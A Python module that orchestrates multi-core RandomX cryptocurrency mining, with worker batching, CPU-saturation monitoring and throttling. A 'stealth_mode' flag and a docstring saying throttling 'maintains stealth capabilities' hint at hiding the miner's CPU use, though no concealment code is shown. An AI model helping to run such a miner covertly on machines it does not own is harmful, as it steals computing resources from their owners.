"""
mining_integration_adapter.py

Integration Adapter for OptimizedCalculationChain với existing mining infrastructure.
Provides seamless integration between new multi-process architecture và current system.

Author: Claude AI Optimization Framework
Purpose: Bridge between optimized components và legacy mining system
"""

import os
import time
import threading
import logging
import subprocess
from typing import Dict, Any, Optional, List, Callable
from concurrent.futures import ThreadPoolExecutor, Future
from dataclasses import dataclass

# Import optimized components
try:
    from .optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
    from .workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
    from .low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
    from .randomx_optimizer import XeonE5OptimizedConfig
except ImportError:
    # Fallback for standalone testing
    from optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
    from workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
    from low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
    from randomx_optimizer import XeonE5OptimizedConfig


@dataclass
class MiningSessionConfig:
    """Configuration cho một mining session"""
    profile: str = "optimized"
    total_iterations: int = 10000000  # 10M iterations per batch
    batch_size: int = 1000000  # 1M iterations per batch
    monitoring_interval: float = 5.0  # Monitor every 5 seconds
    auto_restart: bool = True
    throttling_enabled: bool = True
    stealth_mode: bool = False


@dataclass
class PerformanceMetrics:
    """Real-time performance metrics"""
    timestamp: float
    total_cpu_utilization: float
    per_core_utilization: List[float]
    hashrate: float
    tasks_completed: int
    active_workers: int
    thermal_status: str = "normal"
    efficiency_score: float = 0.0


class MiningIntegrationAdapter:
    """
    Adapter để tích hợp OptimizedCalculationChain với existing mining infrastructure.
    Replaces subprocess-based mining với multi-process optimized approach.
    """
    
    def __init__(self, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger(__name__)
        
        # Core components
        self.calculation_chain: Optional[OptimizedCalculationChain] = None
        self.workload_distributor: Optional[WorkloadDistributor] = None
        self.synchronization: Optional[LowOverheadSynchronization] = None
        self.config_generator = XeonE5OptimizedConfig(logger=self.logger)
        
        # Session management
        self.current_session: Optional[MiningSessionConfig] = None
        self.is_running = False
        self.is_initialized = False
        
        # Performance tracking
        self.performance_history: List[PerformanceMetrics] = []
        self.max_history_size = 1000
        
        # Threading
        self.monitoring_thread: Optional[threading.Thread] = None
        self.workload_thread: Optional[threading.Thread] = None
        self.shutdown_event = threading.Event()
        
        # Integration state
        self.legacy_process_replacement = False
        self.throttling_manager: Optional[Callable] = None
        
        self.logger.info("MiningIntegrationAdapter initialized")
    
    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None) -> bool:
        """
        Initialize optimized mining components.
        Replaces traditional subprocess.Popen approach.
        """
        try:
            if self.is_initialized:
                self.logger.warning("Optimized mining already initialized")
                return True
            
            self.logger.info(f"Initializing optimized mining system for {cores} cores...")
            
            # Generate optimized configuration
            if not config:
                config = self.config_generator.generate_mining_config(
                    performance_profile='optimized', 
                    use_optimized_chain=True
                )
            
            # Initialize core components
            self.calculation_chain = create_optimized_mining_chain(cores=cores, logger=self.logger)
            self.workload_distributor = create_balanced_distributor(cores=cores, logger=self.logger)
            self.synchronization = create_high_performance_sync(cores=cores, logger=self.logger)
            
            # Register RandomX task profile
            randomx_profile = TaskProfile(
                task_type="randomx_mining",
                estimated_complexity=1.2,
                cache_sensitivity=1.8,  # RandomX is cache-sensitive
                parallel_efficiency=0.98  # Excellent parallel efficiency
            )
            self.workload_distributor.register_task_profile("randomx_mining", randomx_profile)
            
            # Initialize calculation chain
            if not self.calculation_chain.initialize_worker_pool():
                raise RuntimeError("Failed to initialize worker pool")
            
            # Start workload distributor
            self.workload_distributor.start()
            
            self.is_initialized = True
            self.legacy_process_replacement = True
            
            self.logger.info("✅ Optimized mining system initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize optimized mining: {e}")
            self.cleanup()
            return False
    
    def start_mining_session(self, session_config: Optional[MiningSessionConfig] = None) -> bool:
        """
        Start mining session với optimized calculation chain.
        Returns True if started successfully.
        """
        try:
            if not self.is_initialized:
                if not self.initialize_optimized_mining():
                    return False
            
            if self.is_running:
                self.logger.warning("Mining session already running")
                return True
            
            # Use default config if none provided
            self.current_session = session_config or MiningSessionConfig()
            
            self.logger.info(f"Starting mining session: profile={self.current_session.profile}")
            
            # Start monitoring
            self.shutdown_event.clear()
            self.monitoring_thread = threading.Thread(
                target=self._monitoring_loop,
                daemon=True,
                name="MiningMonitor"
            )
            self.monitoring_thread.start()
            
            # Start workload management
            self.workload_thread = threading.Thread(
                target=self._workload_management_loop,
                daemon=True,
                name="WorkloadManager"
            )
            self.workload_thread.start()
            
            self.is_running = True
            self.logger.info("✅ Mining session started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start mining session: {e}")
            return False
    
    def stop_mining_session(self) -> bool:
        """
        Stop current mining session gracefully.
        """
        try:
            if not self.is_running:
                self.logger.info("No active mining session to stop")
                return True
            
            self.logger.info("Stopping mining session...")
            
            # Signal shutdown
            self.shutdown_event.set()
            
            # Wait for threads to finish
            if self.monitoring_thread and self.monitoring_thread.is_alive():
                self.monitoring_thread.join(timeout=10.0)
            
            if self.workload_thread and self.workload_thread.is_alive():
                self.workload_thread.join(timeout=10.0)
            
            self.is_running = False
            self.current_session = None
            
            self.logger.info("✅ Mining session stopped successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping mining session: {e}")
            return False
    
    def apply_throttling(self, throttle_percentage: float) -> bool:
        """
        Apply CPU throttling compatible với existing throttling system.
        Maintains stealth capabilities.
        """
        if not self.is_initialized or not self.calculation_chain:
            self.logger.warning("Cannot apply throttling: system not initialized")
            return False
        
        try:
            success = self.calculation_chain.apply_throttling(throttle_percentage)
            if success:
                self.logger.info(f"Applied {throttle_percentage}% throttling to optimized mining")
            return success
            
        except Exception as e:
            self.logger.error(f"Failed to apply throttling: {e}")
            return False
    
    def get_performance_metrics(self) -> Optional[PerformanceMetrics]:
        """Get current performance metrics"""
        if not self.is_initialized:
            return None
        
        try:
            # Get stats from calculation chain
            chain_stats = self.calculation_chain.get_performance_stats()
            
            # Get stats from workload distributor  
            distributor_stats = self.workload_distributor.get_performance_summary()
            
            # Calculate total CPU utilization
            total_cpu = sum(chain_stats['core_utilizations'])
            per_core_cpu = chain_stats['core_utilizations']
            
            # Create metrics object
            metrics = PerformanceMetrics(
                timestamp=time.time(),
                total_cpu_utilization=total_cpu,
                per_core_utilization=per_core_cpu,
                hashrate=chain_stats['average_hashrate'],
                tasks_completed=chain_stats['total_tasks_completed'],
                active_workers=chain_stats['active_workers'],
                efficiency_score=distributor_stats['load_balance_score']
            )
            
            # Add to history
            self.performance_history.append(metrics)
            if len(self.performance_history) > self.max_history_size:
                self.performance_history = self.performance_history[-self.max_history_size//2:]
            
            return metrics
            
        except Exception as e:
            self.logger.error(f"Error getting performance metrics: {e}")
            return None
    
    def _monitoring_loop(self):
        """Background monitoring của mining performance"""
        while not self.shutdown_event.is_set():
            try:
                # Get current metrics
                metrics = self.get_performance_metrics()
                if metrics:
                    # Log performance summary
                    self.logger.debug(f"Mining Performance: {metrics.total_cpu_utilization:.1f}% CPU, "
                                    f"{metrics.hashrate:.2f} H/s, {metrics.active_workers} workers")
                    
                    # Check for performance issues
                    if metrics.total_cpu_utilization < 600:  # Below 75% of 800% target
                        self.logger.warning(f"Low CPU utilization: {metrics.total_cpu_utilization:.1f}%")
                    
                    if metrics.active_workers < self.calculation_chain.cores:
                        self.logger.warning(f"Some workers inactive: {metrics.active_workers}/{self.calculation_chain.cores}")
                
                # Wait for next monitoring interval
                self.shutdown_event.wait(self.current_session.monitoring_interval if self.current_session else 5.0)
                
            except Exception as e:
                self.logger.error(f"Monitoring loop error: {e}")
                self.shutdown_event.wait(5.0)
    
    def _workload_management_loop(self):
        """
        Enhanced workload management loop để ensure continuous CPU utilization.
        Fixes the issue where workers become idle.
        """
        batch_counter = 0
        consecutive_empty_results = 0
        
        while not self.shutdown_event.is_set():
            try:
                if not self.current_session:
                    break
                
                batch_counter += 1
                batch_start_time = time.time()
                
                # Submit multiple overlapping workloads để maintain CPU saturation
                submitted_tasks = []
                for i in range(2):  # Submit 2 batches để prevent worker starvation
                    task_id = self.calculation_chain.submit_workload(
                        total_iterations=self.current_session.batch_size
                    )
                    submitted_tasks.append(task_id)
                    self.logger.info(f"Submitted workload {task_id}: {self.current_session.batch_size} iterations across {self.calculation_chain.cores} cores")
                
                # Collect results with shorter timeout để maintain responsiveness
                all_results = []
                result_collection_start = time.time()
                
                while time.time() - result_collection_start < 15.0:  # Shorter timeout
                    results = self.calculation_chain.get_results(timeout=2.0)
                    if results:
                        all_results.extend(results)
                        consecutive_empty_results = 0
                        
                        # Log performance metrics
                        for result in results:
                            self.logger.debug(f"Core {result.core_id}: {result.iterations_completed} iterations in {result.computation_time:.3f}s")
                            
                            # Update distributor với task completion times
                            if self.workload_distributor:
                                self.workload_distributor.update_task_completion(
                                    result.core_id, 
                                    result.computation_time, 
                                    True
                                )
                    else:
                        consecutive_empty_results += 1
                        if consecutive_empty_results > 5:
                            self.logger.warning("Multiple empty result cycles - checking worker health")
                            break
                
                if all_results:
                    batch_duration = time.time() - batch_start_time
                    total_iterations = sum(r.iterations_completed for r in all_results)
                    avg_cpu = sum(r.cpu_utilization for r in all_results) / len(all_results)
                    
                    self.logger.info(f"Batch {batch_counter} completed: {len(all_results)} results, "
                                   f"{total_iterations} total iterations, "
                                   f"{avg_cpu:.1f}% avg CPU, "
                                   f"{batch_duration:.2f}s duration")
                else:
                    self.logger.warning(f"Batch {batch_counter}: No results received - checking worker status")
                    
                    # Check worker health
                    stats = self.calculation_chain.get_performance_stats()
                    active_workers = stats.get('active_workers', 0)
                    if active_workers < self.calculation_chain.cores:
                        self.logger.error(f"Only {active_workers}/{self.calculation_chain.cores} workers active")
                
                # Minimal pause để maintain continuous operation
                self.shutdown_event.wait(0.1)
                
            except Exception as e:
                self.logger.error(f"Workload management error: {e}")
                self.shutdown_event.wait(2.0)
    
    def cleanup(self):
        """Clean up all resources"""
        try:
            self.logger.info("Cleaning up MiningIntegrationAdapter...")
            
            # Stop session if running
            if self.is_running:
                self.stop_mining_session()
            
            # Shutdown components
            if self.calculation_chain:
                self.calculation_chain.shutdown()
                self.calculation_chain = None
            
            if self.workload_distributor:
                self.workload_distributor.stop()
                self.workload_distributor = None
            
            if self.synchronization:
                self.synchronization.cleanup()
                self.synchronization = None
            
            self.is_initialized = False
            self.legacy_process_replacement = False
            
            self.logger.info("✅ MiningIntegrationAdapter cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")
    
    def get_integration_status(self) -> Dict[str, Any]:
        """Get current integration status"""
        return {
            'initialized': self.is_initialized,
            'running': self.is_running,
            'legacy_replacement': self.legacy_process_replacement,
            'components': {
                'calculation_chain': self.calculation_chain is not None,
                'workload_distributor': self.workload_distributor is not None,
                'synchronization': self.synchronization is not None
            },
            'session_config': self.current_session.__dict__ if self.current_session else None,
            'performance_history_size': len(self.performance_history)
        }
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()


# Factory functions for easy integration
def create_mining_adapter(logger: Optional[logging.Logger] = None) -> MiningIntegrationAdapter:
    """Create mining integration adapter"""
    return MiningIntegrationAdapter(logger=logger)


def replace_subprocess_mining(mining_command: List[str], 
                            logger: Optional[logging.Logger] = None) -> MiningIntegrationAdapter:
    """
    Replace subprocess-based mining với optimized calculation chain.
    Used to replace subprocess.Popen calls in start_mining.py
    """
    adapter = create_mining_adapter(logger=logger)
    
    # Extract cores from system or use default
    cores = os.cpu_count() or 8
    
    # Initialize với optimized settings
    if adapter.initialize_optimized_mining(cores=cores):
        # Start mining session
        session_config = MiningSessionConfig(
            profile="optimized",
            total_iterations=50000000,  # 50M iterations
            batch_size=5000000,         # 5M per batch
            auto_restart=True,
            throttling_enabled=True
        )
        
        if adapter.start_mining_session(session_config):
            logger.info("✅ Successfully replaced subprocess mining với optimized chain")
            return adapter
    
    logger.error("❌ Failed to replace subprocess mining")
    adapter.cleanup()
    return None


if __name__ == "__main__":
    # Test integration adapter
    import sys
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    try:
        with create_mining_adapter(logger=logger) as adapter:
            logger.info("🚀 Testing MiningIntegrationAdapter...")
            
            # Test initialization
            success = adapter.initialize_optimized_mining(cores=8)
            logger.info(f"Initialization: {'✅ SUCCESS' if success else '❌ FAILED'}")
            
            if success:
                # Test mining session
                session_success = adapter.start_mining_session()
                logger.info(f"Mining session: {'✅ SUCCESS' if session_success else '❌ FAILED'}")
                
                if session_success:
                    # Run for a short test period
                    time.sleep(10.0)
                    
                    # Get performance metrics
                    metrics = adapter.get_performance_metrics()
                    if metrics:
                        logger.info(f"📊 Performance Test Results:")
                        logger.info(f"   Total CPU: {metrics.total_cpu_utilization:.1f}%")
                        logger.info(f"   Hashrate: {metrics.hashrate:.2f} H/s")
                        logger.info(f"   Tasks: {metrics.tasks_completed}")
                        logger.info(f"   Workers: {metrics.active_workers}")
                        logger.info(f"   Efficiency: {metrics.efficiency_score:.3f}")
                    
                    # Test throttling
                    throttle_success = adapter.apply_throttling(30.0)
                    logger.info(f"Throttling test: {'✅ SUCCESS' if throttle_success else '❌ FAILED'}")
                    
                    # Stop session
                    stop_success = adapter.stop_mining_session()
                    logger.info(f"Session stop: {'✅ SUCCESS' if stop_success else '❌ FAILED'}")
            
            # Get integration status
            status = adapter.get_integration_status()
            logger.info(f"Integration status: {status}")
            
            logger.info("✅ MiningIntegrationAdapter test completed successfully")
            
    except Exception as e:
        logger.error(f"❌ Test failed: {e}")
        sys.exit(1)